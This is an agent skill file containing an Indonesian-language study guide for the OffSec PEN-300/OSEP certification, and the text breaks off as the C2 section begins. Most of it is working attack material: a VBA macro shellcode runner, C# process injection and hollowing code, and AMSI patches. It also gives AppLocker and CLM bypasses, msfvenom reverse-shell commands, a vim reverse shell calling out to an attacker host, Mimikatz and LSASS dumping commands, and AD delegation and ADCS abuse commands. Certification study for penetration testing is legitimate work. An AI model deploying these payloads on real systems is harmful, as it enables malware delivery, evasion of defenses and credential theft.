---
name: offsec-pen-300
description: OffSec PEN-300 / OSEP (Offensive Security Experienced Penetration Tester) — advanced evasion techniques and breaching defenses. Covers AV/EDR evasion, AMSI/AppLocker/CLM bypass, process injection & hollowing, custom C# shellcode runners, MSSQL linked servers, AD exploitation, delegation attacks, ADCS, and professional report writing.
license: MIT
compatibility: opencode
metadata:
  audience: penetration-testers
  workflow: exploitation
  source: offsec-pen-300
  standard: osep
  year: "2026"
---

# OSEP — Evasion Techniques & Breaching Defenses

## Daftar Isi

1. [Overview & Exam Structure](#1-overview--exam-structure)
2. [OSEP Mindset](#2-osep-mindset)
3. [16 Module Deep-Dive](#3-16-module-deep-dive)
4. [Evasion Techniques Deep-Dive](#4-evasion-techniques-deep-dive)
5. [C2 Framework Strategy](#5-c2-framework-strategy)
6. [Challenge Labs & Exam Strategy](#6-challenge-labs--exam-strategy)
7. [Referensi Lengkap](#7-referensi-lengkap)

---

## 1. Overview & Exam Structure

### Apa Itu OSEP?

OSEP (Offensive Security Experienced Penetration Tester) adalah sertifikasi advanced penetration testing dari OffSec yang mengajarkan **evasion techniques dan breaching defenses**. Berbeda dengan OSCP yang fokus pada enumeration dan exploitation dasar, OSEP mengajarkan cara bypassing security mechanisms modern seperti Windows Defender, AMSI, AppLocker, Constrained Language Mode (CLM), dan EDR solutions.

### Perbedaan OSEP vs OSCP

| Aspek | OSCP+ | OSEP |
|-------|-------|------|
| **Kode level** | 200 | 300 (advanced) |
| **Durasi exam** | 23h45m | 47h45m |
| **Report window** | 24 jam | 24 jam |
| **Fokus utama** | Enumeration, exploitation | Evasion, breaching defenses |
| **Custom payload** | Minimal | Wajib (C#, PowerShell, VBA, JScript) |
| **AV/EDR evasion** | Tidak | Inti dari course |
| **AMSI/AppLocker/CLM** | Tidak | Dibahas mendalam |
| **Process injection** | Dasar | Mendalam (inject, hollow, reflective DLL) |
| **C2 framework** | Tidak diajarkan | Metasploit + opsional Sliver/Mythic |
| **MSSQL attacks** | Tidak | Linked servers, relay |
| **AD exploitation** | Intermediate | Advanced (delegation, trusts, ADCS, forest) |
| **Linux privesc** | Dasar | Shared library, kiosk breakout, VI backdoor |
| **Marks** | 70/100 | 100 pts atau secret.txt |
| **Cert does not expire** | Expires 4 tahun | Yes (does not expire) |

### Scoring & Passing

| Komponen | Detail |
|----------|--------|
| **Durasi exam** | 47 jam 45 menit |
| **Report deadline** | 24 jam setelah exam selesai |
| **Passing option 1** | Capai objectives di control panel (secret.txt) |
| **Passing option 2** | Minimal 100 points |
| **Points per flag** | 10 points (local.txt = low priv, proof.txt = admin/root) |
| **Secret.txt** | Final machine — objective utama jika ambil path ini |
| **Format report** | PDF, nama `OSEP-OS-XXXXX-Exam-Report.pdf` → .7z tanpa password |
| **Upload** | https://upload.offsec.com |
| **Max archive size** | 200MB |

### Exam Environment

- **Proctoring**: Live proctor via webcam (screen share + room scan)
- **VPN**: Isolated OffSec VPN network — corporate network simulation
- **Black box**: Jumlah total machines tidak disebutkan — harus di-enumerate
- **Machine reverts**: 50 reverts total + 1 reset (group-based, not per-machine)
- **Modern OS**: Fully patched Windows 10/11 + Linux — no Windows XP
- **Security solutions**: Windows Defender, AMSI, AppLocker, CLM — aktif
- **Development VM**: Disertakan VM dengan Visual Studio, Office, tools
- **Open book**: Semua sumber kecuali AI chatbots (ChatGPT, YouChat, KAI)
- **Automated tools**: Diizinkan (sqlmap, Metasploit Community, BloodHound, dll)
- **Commercial tools**: DILARANG (Metasploit Pro, Cobalt Strike, Core Impact, Burp Pro)
- **Spoofing attacks**: DILARANG (ARP, DNS, NBNS, IP spoofing — bisa ganggu environment)

### OSCE³ Pathway

OSEP adalah salah satu dari tiga sertifikasi yang membentuk **OSCE³** (Offensive Security Certified Expert³):

| Sertifikasi | Course | Fokus |
|-------------|--------|-------|
| **OSEP** | PEN-300 | Evasion & breaching defenses |
| **OSWE** | WEB-300 | Advanced web attacks & exploitation |
| **OSED** | EXP-301 | Windows exploit development |

Dapatkan ketiga sertifikasi → otomatis awarded OSCE³.

---

## 2. OSEP Mindset

### Filosofi Dasar

OSCP mengajarkan "Try Harder" — enumeration sampai dapat entry point. OSEP mengajarkan **"Bypass Deeper"** — Anda sudah tahu cara exploit, sekarang pelajari cara melakukannya saat ada Defender, AMSI, AppLocker, dan EDR yang menghadang.

Kursus PEN-300 memaksa Anda menghadapi kenyataan yang diabaikan banyak kursus lain: **modern defenses are ON by default**. Anda tidak menyerang box dengan Defender yang dimatikan. Anda secara aktif berperang melawan AMSI, CLM, dan AppLocker.

### Golden Rules OSEP

1. **Custom payloads > off-the-shelf tools** — Anda WAJIB bisa menulis C#, PowerShell, VBA, dan JScript. 80-90% waktu persiapan harus dihabiskan untuk menulis dan menguji payload sendiri. Shellcode default dari msfvenom akan terdeteksi.

2. **Simplify, don't over-engineer** — Satu lapis enkripsi (XOR/AES) + custom loader sudah cukup. Tidak perlu multiple encryption. Simplicity > Complexity.

3. **Automate everything you can** — Buat script otomatis yang regenerate payloads dengan IP/port baru. Siapkan template code untuk semua situasi: process injection, process hollowing, AMSI bypass, AppLocker bypass, dll.

4. **Document as you pwn** — Screenshot setiap langkah dengan IP + hostname + flag. Catat semua command. Report adalah bagian kritis dari passing — reproducibility adalah kunci.

5. **Master ONE C2 framework** — Metasploit cukup untuk exam. Sliver dan Mythic adalah opsi lebih modern. Pilih satu, kuasai dalam tidur.

6. **Know your tools, don't memorize flags** — `--help` adalah teman terbaik. Pahami cara kerja tools, bukan hanya command copy-paste.

7. **Revert is a strategy, not a failure** — Jika stuck > 30 menit, revert environment. Machine sering broken atau state berubah.

8. **Breaks are mandatory** — 48 jam itu marathon. Sleep 6-8 jam. Makan. Jalan. Otak segar > grind 48 jam nonstop.

### Pattern Recognition OSEP

OSEP mengikuti pola-pola yang bisa dikenali dari network enterprise simulation:

- **Phishing vector** → VBA macro / JScript / HTA → download cradle → AMSI bypass → shellcode runner → C2 beacon
- **Web app entry** → file upload / SQLi / SSTI → shell low-priv → privesc via token/service misconfig
- **MSSQL pivot** → linked server → xp_cmdshell enabled → lateral movement ke server lain
- **Delegation abuse** → unconstrained/constrained/RBCD → silver/golden ticket → domain admin
- **ADCS exploit** → ESC1/ESC8 → certificate misconfiguration → domain admin
- **Forest trust** → SIDHistory / Kerberos trust ticket → cross-forest domain admin
- **Linux pivot** → SSH key → shared library hijack → VI backdoor → lateral movement

### 3 Pertanyaan Kunci Saat Stuck

1. **Sudah coba AMSI bypass lain?** — Ada 6+ metode di course. Jika satu gagal, coba yang lain.
2. **Sudah coba delivery method berbeda?** — HTA, VBA, JScript, LNK, InstallUtil, msbuild, rundll32 — semua adalah opsi.
3. **Sudah coba revert?** — Kadang environment broken, bukan skill Anda.

---

## 3. 16 Module Deep-Dive

PEN-300 memiliki 16 modul inti berdasarkan syllabus resmi OffSec. Setiap modul merepresentasikan skill yang diuji di exam.

### Modul 1: Operating System and Programming Theory

Fundamental programming untuk payload development:

- **Win32 API basics**: `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`, `OpenProcess`, `WriteProcessMemory`, `CreateRemoteThread`
- **C# P/Invoke**: Marshaling, DllImport, StructLayout untuk memanggil Windows API dari .NET
- **PowerShell reflection**: Akses assembly internal via `[Ref].Assembly.GetType()`
- **Process architecture**: PEB, TEB, user space vs kernel space, ring protection

**Mindset**: Module ini adalah fondasi. Jika Anda tidak mengerti P/Invoke atau reflection, Anda akan struggle di semua modul berikutnya.

### Modul 2: Client-Side Code Execution with Office

VBA macro development untuk phishing:

**Basic VBA dropper:**
```vba
Private Declare PtrSafe Function CreateThread Lib "kernel32" _
  (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
   ByVal lpStartAddress As LongPtr, lpParameter As Long, _
   ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
  (ByVal lpAddress As Long, ByVal dwSize As Long, _
   ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _
  (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function ShellCode() As LongPtr
  Dim buf As Variant
  Dim addr As LongPtr
  Dim counter As Long
  
  ' XOR-encrypted shellcode from msfvenom
  buf = Array(235, 15, ...)
  
  ' Decode XOR
  For counter = 0 To UBound(buf)
    buf(counter) = buf(counter) Xor &HAA
  Next counter
  
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  RtlMoveMemory addr, buf(0), UBound(buf)
  ShellCode = addr
End Function

Sub AutoOpen()
  CreateThread 0, 0, ShellCode, 0, 0, 0
End Sub
```

**Key concepts:**
- **AutoOpen / Document_Open**: Entry point untuk VBA macro
- **XOR/Caesar cipher**: Encode shellcode di VBA — signature-based AV akan flag plaintext
- **PowerShell download cradle**: VBA execute PowerShell → AMSI bypass → shellcode runner
- **WMI dechain**: Gunakan WMI untuk spawn proses dari VBA

**Mindset**: VBA modern sering diblok oleh Defender dan GPO. Siapkan alternatif (JScript, HTA, LNK).

### Modul 3: Client-Side Code Execution with JScript

JScript execution via Windows Script Host (WSH):

**Key techniques:**
- **HTA file**: HTML Application — `.hta` dieksekusi oleh `mshta.exe`
- **WScript.Shell**: ActiveX object untuk command execution
- **XMLHttpRequest**: Download second stage dari remote server
- **ADODB.Stream**: Write file ke disk
- **DotNetToJScript**: Load .NET assembly from JScript

**DotNetToJScript workflow:**
```
C# shellcode runner → DotNetToJScript → JScript dropper → mshta.exe → execute in memory
```

**Mindset**: JScript sering luput dari deteksi karena kurang umum daripada PowerShell. Gunakan sebagai alternatif saat VBA macro diblok.

### Modul 4: Process Injection and Migration

Teknik menanam shellcode ke proses legit:

**Process Injection (C#):**
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
  uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
  uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
  uint dwCreationFlags, IntPtr lpThreadId);

byte[] buf = DecodeShellcode(encryptedShellcode, key);
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);
CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

**DLL Injection:**
- `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` (load DLL)
- Membutuhkan proses target yang sesuai (explorer.exe, svchost.exe)

**Reflective DLL Injection:**
- Load DLL dari memory tanpa menyentuh disk
- Implementasi manual dari `LoadLibrary` — resolve imports sendiri
- PowerShell version via `Invoke-ReflectivePEInjection`

**Process Hollowing (C#):**
```csharp
// 1. Create suspended process (e.g., svchost.exe)
CreateProcess(svchost, ..., CREATE_SUSPENDED, ..., out pi);

// 2. NtUnmapViewOfSection — unmmap original image
NtUnmapViewOfSection(pi.hProcess, pi.lpBaseAddress);

// 3. VirtualAllocEx — allocate memory di target
VirtualAllocEx(pi.hProcess, pi.lpBaseAddress, ...);

// 4. WriteProcessMemory — write shellcode
// 5. SetThreadContext — set entry point ke shellcode
// 6. ResumeThread — execute
ResumeThread(pi.hThread);
```

**Migration theory:**
- Kenapa migrate ke process lain? Untuk menghindari deteksi, mendapatkan privilege lebih tinggi
- Process apa yang aman? explorer.exe untuk user context, svchost.exe untuk SYSTEM
- `NtCreateSection` + `NtMapViewOfSection` — stealthier daripada VirtualAlloc standar

### Modul 5: Introduction to Antivirus Evasion

Dasar-dasar AV evasion:

**5.1 AV Detection Methods:**
- **Signature-based**: Byte pattern matching — paling mudah di-bypass
- **Heuristic**: Behavioral analysis — lebih sulit
- **Dynamic (sandbox)**: Execute di sandbox — perlu sleep timer, anti-debug

**5.2 Locating Signatures:**
```bash
# Gunakan ThreatCheck atau DefenderCheck
ThreatCheck.exe -f payload.exe
# Output: offset where signature was found
```

**5.3 Metasploit Encoders vs Encryptors:**
```bash
# Encoder (transforms shellcode)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x64/xor_dynamic -i 5 -f csharp

# Encryptor (encrypts entire payload)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT --encrypt xor --encrypt-key $KEY -f csharp
```

**5.4 C# Shellcode Runner Basics:**
- Encrypt shellcode (XOR/AES) — jangan plaintext di source code
- Gunakan sleep timer sebelum injection — hindari sandbox detection
- Panggil API dengan hash (API hashing) — hindari string import detection

**5.5 Behavioral Evasion:**
- **Sleep timers**: `Thread.Sleep(15000)` sebelum inject — sandbox biasanya timeout
- **Non-emulated APIs**: Panggil API yang tidak di-emulate oleh engine AV
- **Delayed execution**: Jangan inject immediatly — tunggu user interaction

**5.6 VBA + Office Evasion:**
- Obfuscate VBA variables (rename `shellcode` → `s` → `a1b2c3`)
- VBA stomping — compile P-code, hapus source
- Split shellcode across multiple variables
- WMI dechain untuk spawn process dari VBA

### Modul 6: Advanced Antivirus Evasion

Teknik evasion level lanjut:

**6.1 AMSI (Antimalware Scan Interface):**
AMSI adalah interface yang memungkinkan aplikasi mengirim konten ke AV engine untuk di-scan sebelum execution. Target utama: PowerShell, VBA, JScript.

**6.2 AMSI Bypass Methods (6 approaches):**

**Method 1 — AmsiInitFailed patch (PowerShell):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
  ? { $_ } |
  % { $_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
```

**Method 2 — AMSI Context nulling:**
```powershell
$a=[Ref].Assembly.GetTypes()
foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

**Method 3 — Reflection-based AmsiScanBuffer patch:**
```powershell
# Patch amsi.dll!AmsiScanBuffer — return 0 (AMSI_RESULT_CLEAN)
# Gunakan Win32 API WriteProcessMemory via reflection
# Cari address AmsiScanBuffer, patch dengan ret 0 bytes
```

**Method 4 — Registry-based (JScript):**
```javascript
var WSH = new ActiveXObject("WScript.Shell");
WSH.RegWrite("HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable", 0, "REG_DWORD");
```

**Method 5 — Custom RunSpace (PowerShell):**
```csharp
// Buat custom PowerShell RunSpace dengan AMSI disabled
// System.Management.Automation.Runspaces.Runspace
// Override initialization untuk skip AMSI
```

**Method 6 — Memory patching via Frida/WinDbg:**
- Hook AmsiScanBuffer via Frida
- Patch AMSI di memory proses lain
- Gunakan WinDbg untuk memahami alur AMSI

**6.3 UAC Bypass vs Defender:**
- **FodHelper**: Registry-based UAC bypass — set `HKCU\Software\Classes\ms-settings\Shell\open\command`
- **EventVwr**: `reg add HKCU\Software\Classes\mscfile\shell\open\command`
- **CMSTray**: COM elevation moniker abuse

**6.4 Bypassing AMSI in JScript vs PowerShell:**
JScript memiliki keuntungan: AMSI untuk JScript kurang mature dibanding PowerShell. Registry bypass sering bekerja tanpa patching.

**6.5 WinDbg for AMSI Analysis:**
```
1. Breakpoint di AmsiScanBuffer
2. Trace alur eksekusi
3. Identifikasi dimana decision dibuat
4. Patch decision point → return AMSI_RESULT_CLEAN
```

### Modul 7: Application Whitelisting

Bypass AppLocker dan whitelisting solutions:

**7.1 AppLocker Theory:**
- **Rule types**: Executable, Windows Installer, Script, Packaged App
- **Default allow**: `Program Files`, `Windows`, `Program Files (x86)`
- **Default block**: Everything else

**7.2 Basic Bypasses:**

**PowerShell + InstallUtil:**
```powershell
# CertUtil decode base64
certutil -encode payload.exe enc.txt

# BitsAdmin download
bitsadmin /Transfer job http://$KALI/enc.txt C:\Temp\enc.txt

# certutil decode
certutil -decode C:\Temp\enc.txt C:\Temp\bypass.exe

# InstallUtil — AppLocker allows .NET trusted binaries
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\bypass.exe
```

**C# InstallUtil Bypass — full class:**
```csharp
[System.ComponentModel.RunInstaller(true)]
public class Loader : System.Configuration.Install.Installer
{
    protected override void OnAfterInstall(IDictionary savedState)
    {
        // Shellcode execution here
        base.OnAfterInstall(savedState);
    }
}
```

**Other bypass methods:**
- **msbuild.exe**: compile dan execute .csproj inline — AppLocker biasanya allow
- **cscript/wscript**: JScript di folder allowed
- **rundll32**: execute JavaScript via `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`
- **regsvr32**: execute .sct file (Scriptlet)
- **psexec**: jika sudah admin

**7.3 CLM (Constrained Language Mode) Bypass:**

CLM membatasi PowerShell ke mode constrained — hanya cmdlets dasar, tidak bisa reflection, tidak bisa Win32 API.

**Bypass methods:**
```powershell
# Method 1: Interactive RunSpace
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()

# Method 2: powershell -version 2 (jika tersedia)
powershell -version 2 -Command "..."

# Method 3: bitsadmin + certutil + InstallUtil
# (bypass CLM karena bukan PowerShell)

# Method 4: Custom RunSpace in C#
# Buat PowerShell RunSpace dengan language mode Full
$runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$runspace.InitialSessionState.LanguageMode = "FullLanguage"
```

### Modul 8: Bypassing Network Filters

Melewati firewall, web proxy, DNS filter, IDS/IPS:

**DNS Filters:**
- **DNS tunneling**: iodine, dnscat2 — encode data in DNS queries
- **DoH (DNS over HTTPS)**: Encrypt DNS queries

**Web Proxies:**
- **Domain fronting**: Gunakan CDN (CloudFront, Azure) sebagai proxy
- **Hidden.asmx**: ASP.NET web service sebagai C2 channel
- **HTTPS inspection bypass**: Gunakan custom certificate, atau TLS 1.3

**IDS/IPS Evasion:**
- **Payload fragmentation**: Split exploit across multiple packets
- **Encoding**: base64, hex, custom encoding
- **SSL/TLS**: Encrypted channel — IDS tidak bisa inspect encrypted payload

**Domain Fronting Implementation:**
```
Client → CDN (CloudFront) → Hidden backend (C2 server)
```
- DNS resolve ke CDN edge
- HTTP Host header menunjuk ke CDN domain
- SNI (Server Name Indication) menunjuk ke hidden backend
- CDN forward request ke backend

### Modul 9: Linux Lateral Movement

Post-exploitation Linux — lebih advanced dari OSCP:

**Shared Library Hijacking:**
```bash
# Cek LD_PRELOAD atau LD_LIBRARY_PATH yang bisa di-write
# Buat shared library dengan constructor
gcc -shared -fPIC -o libevil.so libevil.c -nostartfiles

# Export LD_PRELOAD
LD_PRELOAD=./libevil.so /usr/local/bin/target_binary
```

**VI/Vim Backdoor:**
```bash
# VI modeline exploit
# Jika user membuka file dengan :! atau system()
:!bash -i >& /dev/tcp/$KALI/443 0>&1

# Vim plugin backdoor — tulis di ~/.vim/plugin/
# Auto-execute setiap kali vim jalan
```

**SSH Key Persistence:**
```bash
# Add public key ke authorized_keys
echo "$PUB_KEY" >> ~/.ssh/authorized_keys
# SSH config untuk tunneling
cat >> ~/.ssh/config << EOF
Host jump
  HostName $JUMP_HOST
  User root
  LocalForward 127.0.0.1:2222 10.10.10.10:22
EOF
```

### Modul 10: Kiosk Breakouts

Escape dari kiosk mode / restricted desktop environment:

- **Browser escape**: `file:///` protocol, dev tools console
- **Task Manager**: `Ctrl+Alt+Del` → Task Manager → Run
- **Windows key**: Type "cmd" or "powershell"
- **Shortcut abuse**: `Win+R` → shell:startup
- **Accessibility features**: Sticky Keys (`sethc.exe`) → system level
- **Utilman.exe**: Utilman prompt replacement

### Modul 11: Windows Credentials

Credential dumping techniques:

**Mimikatz (most comprehensive):**
```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
```

**SAM Hive Dumping (without Mimikatz):**
```cmd
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
# Download ke Kali
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**LSASS Dump (when Mimikatz is blocked):**
```cmd
# Task Manager → Dump lsass.exe
# Procdump from Sysinternals
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Download + Mimikatz offline on Kali
```

**Other credential sources:**
- **PowerShell history**: `(Get-PSReadLineOption).HistorySavePath`
- **Browser saved passwords**: SharpChrome, LaZagne
- **RDP credentials**: `cmdkey /list`
- **Group Policy Preferences (cpassword)**: SYSVOL enumeration — cpassword AES key is public
- **WSL credential files**: `/mnt/c/Users/<user>/` — cross-OS credential hunting

### Modul 12: Windows Lateral Movement

Lateral movement techniques:

**RDP Lateral Movement:**
```cmd
# Restricted Admin mode
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -PropertyType DWORD

# RDP via PTH (xfreerdp)
xfreerdp /v:$TARGET /u:$USER /pth:$HASH
```

**Fileless Lateral Movement:**
- **WMI**: `wmic /node:$TARGET process call create "cmd /c ..."`
- **WinRM**: `winrs -r:$TARGET cmd`
- **PowerShell Remoting**: `Invoke-Command -ComputerName $TARGET -ScriptBlock { ... }`
- **SMB exec**: `impacket-smbexec`, `impacket-psexec`, `impacket-wmiexec`
- **DCOM**: `GetTypeFromProgID("MMC20.Application")` → remote execution

**Lateral Movement Mindset:**
```
Get credentials → Test all protocols (SMB, WMI, WinRM, RDP, PSRemoting)
→ Find receptive service → Execute → Collect flags → Dump creds → Repeat
```

### Modul 13: Microsoft SQL Attacks

MSSQL exploitation — salah satu vector paling powerfull:

**Linked Servers — Attack Chain:**
```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;

-- Execute via linked server (xp_cmdshell)
EXECUTE('xp_cmdshell ''whoami''') AT "LINKED_SERVER_NAME";

-- Jika xp_cmdshell disabled, enable via:
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**PowerUpSQL (PowerShell):**
```powershell
# Discover SQL servers
Get-SQLInstanceDomain -DomainController $DC

# Enumerate linked servers
Get-SQLServerLink -Instance $SQL_SERVER

# Crawl all linked servers
Get-SQLServerLinkCrawl -Instance $SQL_SERVER
```

**MSSQL for Lateral Movement:**
```
SQL Server → Linked Server 1 → Linked Server 2 → RCE via xp_cmdshell
```

**MSSQL Hash Relay (NTLM relay):**
```sql
-- Trigger NTLM auth from SQL server ke attacker
EXEC master..xp_dirtree '\\$ATTACKER_IP\share\'
-- Capture hash via Responder/ntlmrelayx
```

**MSSQL Privilege Escalation:**
- **Impersonation**: `EXECUTE AS USER = 'sa'` jika memiliki impersonation privilege
- **DBA privileges**: Jika user adalah sysadmin → full control

### Modul 14: Active Directory Exploitation

Advanced AD attacks — deeper than OSCP:

**Delegation Attacks:**

| Type | Description | Abuse |
|------|-------------|-------|
| **Unconstrained** | Server can delegate to any service | Compromise server → extract TGTs from memory |
| **Constrained** | Server can delegate to specific services | S4U2Self/S4U2Proxy → impersonate user |
| **RBCD** | Resource-based constrained delegation | Abuse `msDS-AllowedToActOnBehalfOfOtherIdentity` |

**Constrained Delegation Abuse (via Rubeus):**
```cmd
# If we have access to a machine with constrained delegation
Rubeus.exe s4u /user:$COMPUTER$ /rc4:$HASH /impersonateuser:Administrator /msdsspn:"TIME/$TARGET" /altservice:cifs /ptt
```

**RBCD Abuse:**
```cmd
# If we have GenericAll/GenericWrite on a computer object
# Create new machine account
impacket-addcomputer DOMAIN.LOCAL/USER:PASS -method LDAPS -computer-name ATTACKER\$ -computer-pass Passw0rd

# Set RBCD on target computer
impacket-rbcd DOMAIN.LOCAL/ATTACKER\$ -delegate-to TARGET\$ -action write

# Request TGS → S4U abuse
impacket-getST DOMAIN.LOCAL/ATTACKER\$:Passw0rd -impersonate Administrator -spn cifs/TARGET.DOMAIN.LOCAL
```

**Forest Trust Attacks:**
- **SIDHistory abuse**: Inject Enterprise Admin SID → extra SID di kerberos ticket
- **Trust ticket (TGT)**: Extract trust key → forge cross-forest TGT
- **MSSQL linked servers across trusts**: SQL Server trust boundaries sering misconfigured

### Modul 15: Active Directory Exploitation — ADCS

**Active Directory Certificate Services (ADCS):**

ADCS adalah vector attack yang ditambahkan di update PEN-300 terbaru. Berdasarkan SpecterOps "Certified Pre-Owned":

| ESC | Attack | Prerequisite |
|-----|--------|-------------|
| **ESC1** | Template with SAN specification + Client Auth EKU | EnrolleeSuppliesSubject enabled, low-privileged can enroll |
| **ESC8** | NTLM relay ke AD CS HTTP endpoint | Web enrollment tanpa EPA/HTTPS |
| **ESC3** | Enrollment Agent abuse | Certificate Request Agent EKU |
| **ESC4** | Template ACL write access | WriteProperty/WriteDACL on template |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | CA flag misconfiguration |

**Tools:**
- **Certipy** (Python): `certipy find -u USER@DOMAIN -p PASS -dc-ip $DC`
- **Certify** (C#): `Certify.exe find /vulnerable`

**ESC1 exploitation:**
```bash
# Find vulnerable template
certipy find -u USER@DOMAIN -p PASS -dc-ip $DC -stdout

# Request certificate as DA
certipy req -u USER@DOMAIN -p PASS -ca CA-SERVER -target $DC -template VULN_TEMPLATE -upn administrator@DOMAIN

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip $DC
```

### Modul 16: Combining the Pieces

Module ini mengintegrasikan semua teknik ke dalam attack chain:

**Full Attack Chain Example:**
```
1. Phishing → VBA macro → AMSI bypass → PowerShell shellcode runner → C2 beacon
2. Enumerate domain → BloodHound → find delegation misconfiguration
3. Abuse RBCD → TGS as DA → domain admin on Domain A
4. Dump DC → extract trust key → forge ticket ke Domain B
5. Cross-forest → compromise Domain B
6. Find ADCS → ESC1 → certificate as Enterprise Admin
7. DCSync → full forest compromise → secret.txt
```

---

## 4. Evasion Techniques Deep-Dive

### AMSI Bypass — Complete Reference

AMSI adalah pertahanan lapisan pertama PowerShell. Ada 6 metode untuk bypass:

| Method | Approach | Works On | Reliability |
|--------|----------|----------|-------------|
| 1 | `amsiInitFailed` reflection | Win 10/11 | High |
| 2 | AmsiContext nulling | Win 10 | High |
| 3 | AmsiScanBuffer memory patch | Win 10/11 20H2+ | High |
| 4 | Registry disable (JScript) | All | Medium |
| 5 | Custom RunSpace (C#) | All | High |
| 6 | Frida hook / WinDbg patch | Dev environment | Low (research) |

**Method 3 — AmsiScanBuffer Patch (Most Reliable 2025+):**
```powershell
# Find AmsiScanBuffer address
$amsi = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE('amsi.dll')
$export = [System.Runtime.InteropServices.Marshal]::GetProcAddress($amsi, 'AmsiScanBuffer')

# Patch: xor eax, eax + ret (6 bytes: 31 C0 C3)
$patch = [Byte[]]@(0x31, 0xC0, 0xC3)

# Write patch via VirtualProtect + WriteProcessMemory
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $export, 3)
```

### CLM Bypass — Complete Reference

| Method | Technique | Tooling |
|--------|-----------|---------|
| 1 | Interactive RunSpace | PowerShell |
| 2 | InstallUtil + .NET | C# Installer class |
| 3 | msbuild compile inline | .csproj |
| 4 | regsvr32 .sct | JScript .sct |
| 5 | PowerShell -version 2 | Built-in (jika tersedia) |

**Interactive RunSpace Method:**
```powershell
# Works in CLM — spawn full language RunSpace
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript('Get-ChildItem Env:').Invoke()
```

### AppLocker Bypass — Complete Reference

| Method | Binary | Notes |
|--------|--------|-------|
| 1 | `InstallUtil.exe` | .NET uninstall — AppLocker allows by default |
| 2 | `msbuild.exe` | Compile and execute inline .csproj |
| 3 | `cscript.exe` / `wscript.exe` | JScript in allowed paths |
| 4 | `rundll32.exe` | JavaScript URL execution |
| 5 | `regsvr32.exe` | .sct scriptlet execution |
| 6 | `psexec.exe` | If admin — lateral movement |
| 7 | `bginfo.exe` | Execute from `C:\Program Files\` |

### Payload Encoding Pipeline

```
Shellcode (msfvenom raw)
  → XOR/AES encryption (Python script)
  → Base64 encode (for PowerShell)
  → OR C# array (for process injector)
  → OR VBA array (for macro)
  → OR encrypted file (for remote loading via NetLoader)
```

**Python XOR encoder:**
```python
import sys

shellcode = bytearray(open(sys.argv[1], 'rb').read())
key = 0xAA

encoded = [b ^ key for b in shellcode]
# Output as C# array
output = '{ ' + ', '.join(f'0x{b:02x}' for b in encoded) + ' }'
print(output)
```

**C# Decode + Inject:**
```csharp
static byte[] Decode(byte[] buf, byte key) {
    byte[] decoded = new byte[buf.Length];
    for (int i = 0; i < buf.Length; i++)
        decoded[i] = (byte)(buf[i] ^ key);
    return decoded;
}

static void Main() {
    byte[] encoded = new byte[] { 0x... };  // encrypted shellcode
    byte[] shellcode = Decode(encoded, 0xAA);
    
    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
    CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
}
```

### Defender Evasion Strategy

Layered approach — jangan bergantung pada satu teknik:

```
Layer 1: Encrypted shellcode (XOR/AES) — bypass static signature
Layer 2: Custom loader — bypass behavioral detection
Layer 3: Process injection/hollowing — bypass memory scan
Layer 4: Sleep timer + decoy — bypass sandbox/emulation
Layer 5: AMSI bypass (if using PowerShell) — bypass script scan
Layer 6: AppLocker bypass — bypass execution policy
```

---

## 5. C2 Framework Strategy

### Metasploit (Recommended for Exam)

Metasploit adalah C2 default yang digunakan di seluruh PEN-300. Alasan memilih Metasploit:
